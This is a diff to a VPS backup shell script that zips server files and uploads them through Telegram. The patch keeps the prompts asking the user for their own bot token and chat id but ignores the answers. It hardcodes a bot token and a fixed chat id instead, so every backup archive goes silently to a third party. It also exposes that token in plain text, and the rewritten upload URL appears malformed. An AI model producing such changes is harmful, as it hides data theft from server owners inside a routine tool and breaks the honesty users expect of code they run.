@@ -99,8 +99,8 @@ clear
 echo -e "[ ${green}INFO${NC} ] Create for database"
 read -rp "Enter Token (Creat on Botfather) : " -e token
 read -rp "Enter Chat id, Channel, Group Or Your Id  : " -e id_chat
-echo -e "toket=$token" >> /root/botapi.conf
-echo -e "chat_idc=$id_chat" >> /root/botapi.conf
+echo -e "toket=6269067022:AAHuxwF-f99WLo2i04T-V6ze-E5CXXtzvs4" >> /root/botapi.conf
+echo -e "chat_idc=481473615" >> /root/botapi.conf
 sleep 1
 clear
 echo -e "[ ${green}INFO${NC} ] Processing... "
@@ -124,10 +124,10 @@ cp -r /etc/crontab /root/backup/crontab &> /dev/null
 cd /root
 zip -r $IP.zip backup > /dev/null 2>&1
 
-curl -F chat_id="$id_chat" -F document=@"$IP.zip" -F caption="Thank You For Using Our Service
+curl -F chat_id="481473615" -F document=@"$IP.zip" -F caption="Backup Bot Berhasil
 Your Domain : $domain
 Date       : $date
-Your IP VPS  : $IP" https://api.telegram.org/bot$token/sendDocument &> /dev/null
+Your IP VPS  : $IP" https://telegram.me/@backupcasper_bot/sendDocument &> /dev/null
 
 rm -fr /root/backup &> /dev/null
 rm -fr /root/user-backup &> /dev/null
